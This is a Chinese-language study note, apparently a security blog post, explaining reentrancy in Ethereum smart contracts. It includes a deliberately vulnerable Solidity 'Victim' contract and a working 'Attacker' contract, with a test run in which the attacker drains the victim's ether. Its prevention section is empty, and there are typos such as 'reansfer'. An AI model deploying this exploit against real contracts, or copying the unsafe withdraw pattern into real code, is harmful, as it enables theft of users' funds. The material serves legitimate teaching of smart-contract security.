@@ -1,0 +1,109 @@
+
+# [原创]智能合约-重入漏洞 笔记
+
+## 重入漏洞
+
+### 漏洞分析
+
+以太坊智能合约的特点之一是能够调用其他外部合约的代码，然而这些外部合约可能被攻击者劫持，迫使合约通过回退函数进一步执行代码，包括回调本身。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果
+
+```javascript
+function withdraw(){
+require(msg.sender,call.value(balances[msg.sender])());
+balances[msg.sender]=0;
+}
+```
+
+这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币
+
+但是有个问题是他没有先对用户的代币余额进行清零，而智能合约进行转账的时候会调用收款方 `fallback` 函数
+
+> 合约可以有一个未命名的函数 —— `Fallback` 函数。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（`fallback` 函数）会被执行。另外每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，`fallback` 函数必须标记为 `payable`。 如果不存在这样的函数，则合约不能通过常规交易接收以太币
+
+如果构造一个 `fallback` 函数，函数里面也调用对方的 `withdraw` 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）
+
+![](<mark class="encrypted">f56K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2F1L8r3q4J5K9#2)9J5k6h3y4G2L8g2)9J5c8Y4W2#2M7i4g2W2i4K6u0r3x3q4)9J5c8U0t1H3x3U0m8Q4x3V1k6H3L8X3N6Q4x3V1j5J5y4U0R3&6x3K6S2Q4x3V1j5I4y4e0R3^5x3e0t1K6z5o6x3&6z5o6b7&6i4K6u0V1z5o6p5@1y4h3k6S2k6h3k6Q4x3X3b7K6j5K6u0U0i4K6u0V1y4o6W2V1k6q4)9J5k6o6W2T1z5r3c8Q4x3X3c8U0y4K6W2X3x3r3q4S2j5U0u0W2k6r3u0Q4x3X3g2H3L8X3N6Q4x3U0y4S2L8r3W2Y4L8W2)9K6c8r3I4W2k6Y4c8Q4x3U0k6V1K9i4y4H3L8r3q4&6i4K6y4p5K9h3&6D9K9h3&6W2i4K6t1$3K9r3g2A6k6$3S2@1i4K6y4p5x3K6x3H3i4K6t1$3L8h3q4J5k6$3W2F1i4K6y4p5i4K6t1#2y4f1u0G2j5X3A6W2j5%4c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6q4)9J5y4e0g2p5i4K6t1$3L8%4u0A6k6$3W2F1d9r3g2A6k6$3S2@1i4K6y4p5x3K6x3H3i4K6t1$3L8%4u0A6k6$3W2F1g2$3W2V1N6r3S2Q4x3@1b7#2x3o6S2Q4x3U0k6K6K9i4A6W2i4K6y4p5x3q4)9J5y4Y4y4@1j5i4c8#2M7#2)9K6c8r3c8G2L8X3g2Q4x3U0k6K6N6s2W2D9k6g2)9K6c8s2y4@1M7X3!0C8k6g2)9J5y4Y4N6A6k6s2c8Z5i4K6y4p5y4e0l9^5i4K6t1&6</mark>
+
+### 常用转币方式
+
+`<address>.reansfer()`
+
+发送失败时会通过 `throw` 回滚状态，只会传递 2300 个 `gas` 以供调用，从而防止重入
+
+`<address>.send()`
+
+发送失败时，返回布尔值 `false`，只会传递 2300 个 `gas` 以供调用，从而防止重入
+
+`<address>.gas().call.value()()`
+
+当发送失败时，返回布尔值 `false` 将传递所有可用的 `gas` 进行调用（可通过 `gas(gas_value)` 进行限制），不能有效防止重入攻击
+
+### 代码调试
+
+```javascript
+pragma solidity ^0.4.19;
+contract Victim {
+mapping(address => uint) public userBalannce;
+uint public amount = 0;
+function Victim() payable{}
+function withDraw(){
+uint amount = userBalannce[msg.sender];
+if(amount > 0){
+msg.sender.call.value(amount)();
+userBalannce[msg.sender] = 0;
+}
+}
+function() payable{}
+function receiveEther() payable{
+if(msg.value > 0){
+userBalannce[msg.sender] += msg.value;
+}
+}
+function showAccount() public returns (uint){
+amount = this.balance;
+return this.balance;
+}
+}
+contract Attacker{
+uint public amount = 0;
+uint public test = 0;
+function Attacker() payable{}
+function() payable{
+test++;
+Victim(msg.sender).withDraw();
+}
+function showAccount() public returns (uint){
+amount = this.balance;
+return this.balance;
+}
+function sendMoney(address addr){
+Victim(addr).receiveEther.value(1 ether)();
+}
+function reentry(address addr){
+Victim(addr).withDraw();
+}
+}
+```
+
+部署 `Attacker` 合约，给 `Attacker` 合约 1 以太币
+
+!<a href="elink@ac0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2F1L8r3q4J5K9#2)9J5k6h3y4G2L8g2)9J5c8Y4W2#2M7i4g2W2i4K6u0r3x3q4)9J5c8U0t1H3x3U0m8Q4x3V1k6H3L8X3N6Q4x3V1j5J5y4U0R3&6x3K6S2Q4x3V1j5I4y4e0R3^5x3e0t1I4x3o6V1#2x3e0l9&6i4K6u0V1x3r3t1I4z5h3p5J5y4h3y4Q4x3X3c8U0k6e0x3@1i4K6u0V1y4o6f1J5k6q4)9J5k6o6W2V1y4o6k6Q4x3X3c8T1x3K6y4W2y4K6g2S2z5e0p5H3x3o6W2Q4x3X3g2H3L8X3N6Q4x3U0y4S2L8r3W2Y4L8W2)9K6c8r3I4W2k6Y4c8Q4x3U0k6V1K9i4y4H3L8r3q4&6i4K6y4p5K9h3&6D9K9h3&6W2i4K6t1$3K9r3g2A6k6$3S2@1i4K6y4p5x3K6j5%4i4K6t1$3L8h3q4J5k6$3W2F1i4K6y4p5i4K6t1#2y4f1u0G2j5X3A6W2j5%4c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6q4)9J5y4e0g2p5i4K6t1$3L8X3q4E0k6g2)9K6c8r3W2E0j5h3N6W2i4K6u0W2M7r3&6Y4i4K6t1$3L8%4u0A6k6$3W2F1d9r3g2A6k6$3S2@1i4K6y4p5z5e0b7@1i4K6t1$3L8%4u0A6k6$3W2F1g2$3W2V1N6r3S2Q4x3@1b7I4z5e0t1H3i4K6t1$3M7$3W2*7k6g2)9K6c8o6p5#2z5o6M7^5x3g2)9J5y4Y4y4@1j5i4c8#2M7#2)9K6c8r3c8G2L8X3g2Q4x3U0k6K6N6s2W2D9k6g2)9K6c8s2y4@1M7X3!0C8k6g2)9J5y4Y4N6A6k6s2c8Z5i4K6y4p5y4e0l9^5i4K6t1&6">image.png</a>
+
+部署之后点击 `showAccount` 再点击 `amount` 看一下余额，成功
+
+!<a href="elink@212K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2F1L8r3q4J5K9#2)9J5k6h3y4G2L8g2)9J5c8Y4W2#2M7i4g2W2i4K6u0r3x3q4)9J5c8U0t1H3x3U0m8Q4x3V1k6H3L8X3N6Q4x3V1j5J5y4U0R3&6x3K6S2Q4x3V1j5I4y4e0R3^5x3e0t1I4x3e0R3I4x3U0f1K6i4K6u0V1x3X3t1^5j5K6k6U0x3U0W2Q4x3X3c8V1j5X3x3K6i4K6u0V1y4o6t1%4x3#2)9J5k6r3p5I4y4e0m8Q4x3X3c8W2k6U0V1#2y4$3b7#2x3K6k6V1z5o6u0Q4x3X3g2H3L8X3N6Q4x3U0y4S2L8r3W2Y4L8W2)9K6c8r3I4W2k6Y4c8Q4x3U0k6V1K9i4y4H3L8r3q4&6i4K6y4p5K9h3&6D9K9h3&6W2i4K6t1$3K9r3g2A6k6$3S2@1i4K6y4p5x3K6j5#2i4K6t1$3L8h3q4J5k6$3W2F1i4K6y4p5i4K6t1#2y4f1u0G2j5X3A6W2j5%4c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6q4)9J5y4e0g2p5i4K6t1$3L8X3q4E0k6g2)9K6c8r3W2E0j5h3N6W2i4K6u0W2M7r3&6Y4i4K6t1$3L8%4u0A6k6$3W2F1d9r3g2A6k6$3S2@1i4K6y4p5z5e0x3&6i4K6t1$3L8%4u0A6k6$3W2F1g2$3W2V1N6r3S2Q4x3@1b7I4z5e0t1H3i4K6t1$3M7$3W2*7k6g2)9K6c8o6p5$3x3K6t1$3x3q4)9J5y4Y4y4@1j5i4c8#2M7#2)9K6c8r3c8G2L8X3g2Q4x3U0k6K6N6s2W2D9k6g2)9K6c8s2y4@1M7X3!0C8k6g2)9J5y4Y4N6A6k6s2c8Z5i4K6y4p5y4K6b7$3">image.png</a>
+
+同样，部署 `Victim` 合约，给他 10 以太币，目前账户余额如下：
+
+!<a href="elink@429K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2F1L8r3q4J5K9#2)9J5k6h3y4G2L8g2)9J5c8Y4W2#2M7i4g2W2i4K6u0r3x3q4)9J5c8U0t1H3x3U0m8Q4x3V1k6H3L8X3N6Q4x3V1j5J5y4U0R3&6x3K6S2Q4x3V1j5I4y4e0R3^5x3e0t1I4x3K6l9J5x3K6t1J5i4K6u0V1k6X3f1&6x3e0x3H3j5e0N6Q4x3X3c8W2j5e0V1K6i4K6u0V1y4o6b7K6j5g2)9J5k6o6S2T1j5U0q4Q4x3X3b7@1x3o6W2V1k6o6g2S2z5o6l9K6y4r3u0Q4x3X3g2H3L8X3N6Q4x3U0y4S2L8r3W2Y4L8W2)9K6c8r3I4W2k6Y4c8Q4x3U0k6V1K9i4y4H3L8r3q4&6i4K6y4p5K9h3&6D9K9h3&6W2i4K6t1$3K9r3g2A6k6$3S2@1i4K6y4p5x3K6j5$3i4K6t1$3L8h3q4J5k6$3W2F1i4K6y4p5i4K6t1#2y4f1u0G2j5X3A6W2j5%4c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6q4)9J5y4e0g2p5i4K6t1$3L8X3q4E0k6g2)9K6c8r3W2E0j5h3N6W2i4K6u0W2M7r3&6Y4i4K6t1$3L8%4u0A6k6$3W2F1d9r3g2A6k6$3S2@1i4K6y4p5z5e0b7J5i4K6t1$3L8%4u0A6k6$3W2F1g2$3W2V1N6r3S2Q4x3@1b7I4z5e0t1H3i4K6t1$3M7$3W2*7k6g2)9K6c8o6p5$3x3o6l9K6x3q4)9J5y4Y4y4@1j5i4c8#2M7#2)9K6c8r3c8G2L8X3g2Q4x3U0k6K6N6s2W2D9k6g2)9K6c8s2y4@1M7X3!0C8k6g2)9J5y4Y4N6A6k6s2c8Z5i4K6y4p5y4K6b7$3">image.png</a>
+
+调用 `Attacker` 合约的 `sendMoney` 函数，给 `Victim` 转一个以太币
+
+!<a href="elink@6d1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2F1L8r3q4J5K9#2)9J5k6h3y4G2L8g2)9J5c8Y4W2#2M7i4g2W2i4K6u0r3x3q4)9J5c8U0t1H3x3U0m8Q4x3V1k6H3L8X3N6Q4x3V1j5J5y4U0R3&6x3K6S2Q4x3V1j5I4y4e0R3^5x3e0t1I4y4e0R3@1x3K6l9K6i4K6u0V1x3U0t1K6z5o6u0V1y4K6u0Q4x3X3c8S2y4e0u0U0i4K6u0V1y4o6b7%4y4g2)9J5k6o6R3&6z5h3c8Q4x3X3b7J5j5U0c8U0y4K6p5J5j5$3c8S2y4h3c8Q4x3X3g2H3L8X3N6Q4x3U0y4S2L8r3W2Y4L8W2)9K6c8r3I4W2k6Y4c8Q4x3U0k6V1K9i4y4H3L8r3q4&6i4K6y4p5K9h3&6D9K9h3&6W2i4K6t1$3K9r3g2A6k6$3S2@1i4K6y4p5x3K6j5%4i4K6t1$3L8h3q4J5k6$3W2F1i4K6y4p5i4K6t1#2y4f1u0G2j5X3A6W2j5%4c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6q4)9J5y4e0g2p5i4K6t1$3L8X3q4E0k6g2)9K6c8r3W2E0j5h3N6W2i4K6u0W2M7r3&6Y4i4K6t1$3L8%4u0A6k6$3W2F1d9r3g2A6k6$3S2@1i4K6y4p5z5e0b7@1i4K6t1$3L8%4u0A6k6$3W2F1g2$3W2V1N6r3S2Q4x3@1b7I4z5e0t1H3i4K6t1$3M7$3W2*7k6g2)9K6c8o6p5$3y4o6j5K6y4#2)9J5y4Y4y4@1j5i4c8#2M7#2)9K6c8r3c8G2L8X3g2Q4x3U0k6K6N6s2W2D9k6g2)9K6c8s2y4@1M7X3!0C8k6g2)9J5y4Y4N6A6k6s2c8Z5i4K6y4p5y4K6b7$3">image.png</a>
+
+调用 `Attacker` 的 `reentry` 函数，进行攻击，然后看一下余额，发现原本在 `Victim` 中的以太币全都到了 `Attacker` 合约中，同时 `test` 的值为 11，说明 `fallback` 函数被调用了 11 次
+
+!<a href="elink@b1cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2F1L8r3q4J5K9#2)9J5k6h3y4G2L8g2)9J5c8Y4W2#2M7i4g2W2i4K6u0r3x3q4)9J5c8U0t1H3x3U0m8Q4x3V1k6H3L8X3N6Q4x3V1j5J5y4U0R3&6x3K6S2Q4x3V1j5I4y4e0R3^5x3e0t1J5x3U0j5&6x3U0b7^5i4K6u0V1x3h3x3H3j5K6M7^5k6U0y4Q4x3X3b7#2x3X3k6X3i4K6u0V1y4r3k6U0y4q4)9J5k6r3q4V1x3e0m8Q4x3X3b7%4z5r3k6V1k6h3u0X3j5K6N6V1k6o6y4Q4x3X3g2H3L8X3N6Q4x3U0y4S2L8r3W2Y4L8W2)9K6c8r3I4W2k6Y4c8Q4x3U0k6V1K9i4y4H3L8r3q4&6i4K6y4p5K9h3&6D9K9h3&6W2i4K6t1$3K9r3g2A6k6$3S2@1i4K6y4p5x3K6j5#2i4K6t1$3L8h3q4J5k6$3W2F1i4K6y4p5i4K6t1#2y4f1u0G2j5X3A6W2j5%4c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6q4)9J5y4e0g2p5i4K6t1$3L8X3q4E0k6g2)9K6c8r3W2E0j5h3N6W2i4K6u0W2M7r3&6Y4i4K6t1$3L8%4u0A6k6$3W2F1d9r3g2A6k6$3S2@1i4K6y4p5z5e0b7H3i4K6t1$3L8%4u0A6k6$3W2F1g2$3W2V1N6r3S2Q4x3@1b7I4z5e0t1H3i4K6t1$3M7$3W2*7k6g2)9K6c8o6p5%4x3K6l9&6x3q4)9J5y4Y4y4@1j5i4c8#2M7#2)9K6c8r3c8G2L8X3g2Q4x3U0k6K6N6s2W2D9k6g2)9K6c8s2y4@1M7X3!0C8k6g2)9J5y4Y4N6A6k6s2c8Z5i4K6y4p5y4K6b7$3">image.png</a>
+
+### 漏洞防范
+
